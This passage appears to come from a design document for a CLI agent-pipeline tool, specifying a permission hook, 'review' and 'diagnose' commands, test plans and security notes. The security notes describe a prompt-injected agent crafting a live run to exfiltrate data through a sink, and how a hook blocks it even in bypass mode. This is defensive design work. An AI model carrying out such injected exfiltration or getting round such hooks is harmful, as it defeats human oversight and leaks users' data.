- [ ] The PreToolUse hook denies an un-approved consequential `--live`/sink Bash call and exits `2`
      on a hard violation (verified to override an `allow` rule / bypassPermissions).
- [ ] `ceiling_reached` (UNFILED-COST) makes the hook deny regardless of approval.

**Test plan** — `packages/crawfish/tests/test_code_gate.py`: stage a candidate, assert
`apply` without approval exits `7`; with an approval row, applies; `reject` rolls back via
`LearningLoop.rollback` with a `MockRuntime` asserting zero model calls. Hook unit test:
feed the hook a synthetic PreToolUse event for `craw run --live` with no approval → assert
`permissionDecision:"deny"`; with `ceiling_reached` → deny; with approval + under ceiling →
`allow`. (Hook logic is pure over the approval queue + cost state — testable offline.)

**Security review notes** — This is the §12.1 trust-collapse mitigation made enforcement.
SECURITY.md rule 7 (consequential sink fires only in eval mode) + the language-era rule
"a generated artifact must pass the assembly gate to ship": `apply` must re-run
`assert_build_safe` before promotion. The approval queue is the secret-broker queue,
fail-closed (rule 6, install-time consent analogue). The hook is the only thing that holds
when the agent is itself injected — it must be defense-in-depth atop the runtime
`StaticOnlyError`/`TargetMustBeStaticError`, never a replacement. Red-team: an injected
agent that crafts `craw run --live` to exfiltrate via a sink must be denied by the hook
even under `--dangerously-skip-permissions`/bypass mode (exit 2 backstop).

---

### UNFILED-REVIEW — `craw code review [--since]`: ledger/observer → "what needs attention" digest
**Milestone:** M6 · **Priority:** Urgent · **Depends on:** CRA-252, CRA-254
**Context** — RFC §12.4 (Urgent) "close the self-generating loop": aggregate ledger/observer
events into an agent-readable digest with a **suggested next authoring action** per finding.
This is what turns the dashboard's human-facing view into an agent-actionable feedback
signal — the loop's closing edge.

**Design** — `craw code review` reads the surface (`ObserverSurface.events`/`.run_info`,
the optimizer audit, the DLQ via `list_dead_letters` — `executor.py:31`) over a `--since`
window and folds them into a ranked digest of findings. Each finding carries a **suggested
next authoring action** mapping the finding kind to a concrete `craw code`/`craw` move:
- `cost.spike` / over-`expected_usd` → "tune for cost: `craw code optimize <comp>
  --mode tune`".
- `quality.flag` / failing eval → "`craw code optimize <comp> --mode refine`" or open the
  definition.
- `failure.rate` spike / DLQ entries → "`craw code diagnose <run_id>`".
- regression vs baseline → "review the last `propose`; consider `craw code reject`".
The digest is `--json` so the agent consumes it directly (closing the self-generating
loop), and human-readable text by default.

**Interface**
```text
craw code review [--since -1d] [--org local] [--json]
```
```json
{"schema": "craw.code.review.v1", "since": "-1d", "org_id": "local",
 "findings": [
   {"severity": "warn", "kind": "cost.spike", "pipeline": "triage-bot",
    "run_id": "01HZ...", "detail": "<encoded>",
    "suggested_action": "craw code optimize definitions/triage --mode tune"},
   {"severity": "critical", "kind": "failure.rate", "pipeline": "triage-bot",
    "dlq_count": 3, "suggested_action": "craw code diagnose 01HZ..."}
 ]}
```
Exit codes: `0` (digest produced, even if empty), `3` no ledger.

**Acceptance criteria**
- [ ] Aggregates observer events + run-info + DLQ entries over `--since`.
- [ ] Each finding carries a deterministic `suggested_action` for its kind.
- [ ] Findings ranked by severity then recency.
- [ ] `--json` stable under `craw.code.review.v1`; `detail` is output-encoded.

**Test plan** — `packages/crawfish/tests/test_code_review.py`: seed a `cost.spike`, a
`failure.rate` + 3 DLQ entries, and a baseline regression; assert the digest contains the
three findings with the right `suggested_action` strings and severity ordering. Two-org
isolation. An injected-markup `detail` is asserted encoded in the JSON-string field
(belt-and-braces, since an agent may re-render it).

**Security review notes** — Reads the scrubbed surface only. `detail` is fluid/tainted and
is carried encoded so a downstream renderer (or the dashboard) cannot be injected. `--since`
is a static window string (no fluid input reaches a sink). The `suggested_action` is a
*suggestion* the agent still runs through the HITL gate before any `--live` move.

---

### UNFILED-DIAGNOSE — `craw code diagnose <run_id>`: ledger + DLQ + observer events → structured root cause
**Milestone:** M6 · **Priority:** Medium · **Depends on:** CRA-252, UNFILED-REVIEW (none hard)
**Context** — RFC §12.4 (Medium): debug a failed run. The inputs all exist — the ledger
record, the DLQ (`list_dead_letters`/`dead_letter` — `executor.py:30-31`), observer events
(`ObserverSurface.events`), and the failing IO. This verb correlates them into a structured
root cause and points at `craw replay --swap` (`crawfish/replay_swap.py`) to test a fix for
near-$0.

**Design** — `craw code diagnose <run_id>` joins, over the surface and ledger:
- the `RunInfo` for the run (status, backend, version, cost),
- its `ObserverEvent`s (`events(pipeline, …)` filtered to the run),
- DLQ entries for the batch (`list_dead_letters(ctx, batch_id)` — read-only),
- the failing node IO from the emission/inspector stream.
It produces a **structured root-cause record**: the first failing node, the error class
(timeout / budget / validation / sink-gate), the implicated input item, and a **remediation
pointer** — concretely, the exact `craw replay --swap` command to re-run the historical run
against a candidate model/decode change (every unaffected leaf replays bit-for-bit; only the
dirtied fraction re-executes — near-$0).

**Interface**
```text
craw code diagnose <run_id> [--org local] [--json]
```
```json
{"schema": "craw.code.diagnose.v1", "run_id": "01HZ...", "pipeline": "triage-bot",
 "status": "failed", "first_failure": {"node": "summarize", "error_class": "validation",
   "item_id": "ticket-42", "detail": "<encoded>"},
 "dlq": [{"item_id": "ticket-42", "reason": "schema mismatch"}],
 "observer_events": ["failure.rate", "quality.flag"],
 "remediation": {"action": "replay_swap",
   "command": "craw replay --swap model=claude-x 01HZ...",
   "estimated_usd": 0.0}}
```
Exit codes: `0` diagnosed, `1` no such run, `3` no ledger.

**Acceptance criteria**
- [ ] Correlates `RunInfo` + observer events + DLQ + failing IO for the run.
- [ ] Identifies the first failing node and an error class.
- [ ] Emits a concrete `craw replay --swap <run_id>` remediation command, $0 estimate.
- [ ] DLQ read is read-only (never drains/deletes entries); `--json` stable under `craw.code.diagnose.v1`.

**Test plan** — `packages/crawfish/tests/test_code_diagnose.py`: seed a failed run with a
DLQ entry (`dead_letter(...)`) and a `failure.rate` event; assert `first_failure.node`, the
error class, the DLQ correlation, and the exact `replay --swap` command string. Verify the
DLQ is untouched after diagnose (read-only). Two-org isolation on the run lookup.

**Security review notes** — Reads scrubbed surface + ledger only; failing-IO `detail` is
fluid/tainted → output-encoded in the JSON and never interpreted as instruction. The
remediation only *suggests* `replay --swap` (which is eval-mode, near-$0, refuses an
over-budget dirtied live cascade per the roadmap) — it fires nothing itself. DLQ access is
read-only, so diagnose cannot lose or replay an item out of band.

---

## Cross-cutting notes

- **Schema versioning.** Every `--json` payload carries a `schema` key
  (`craw.code.<verb>.v<N>`) and is snapshot-tested, consistent with RFC §3.2 / CRA-269's
  version negotiation. Parsers are forward-compatible (ignore unknown fields).
- **Error envelope.** Every non-zero exit emits the `craw.error.v1` envelope
  (`code`, `retryable`, `remediation`); security rejections are `retryable:false`
  (CRA-270).
- **Determinism.** All tests use temp/in-memory `Store` fixtures + `MockRuntime` /
  record-replay (`crawfish.testing`); **no live model calls** (CLAUDE.md Definition of
  Done). New fluid surfaces (the dashboard renderer) add a red-team payload to
  `crawfish.testing.redteam_attacks` per SECURITY.md's behavioural gate.
- **ADR to write.** `docs/architecture/decisions/0008-observer-surface-dashboard-seam.md`
  (create the `decisions/` dir): the dashboard read-model seam, loopback bind,
  Python-aggregation-over-scrubbed-rows, and rejected direct-SQLite alternative.
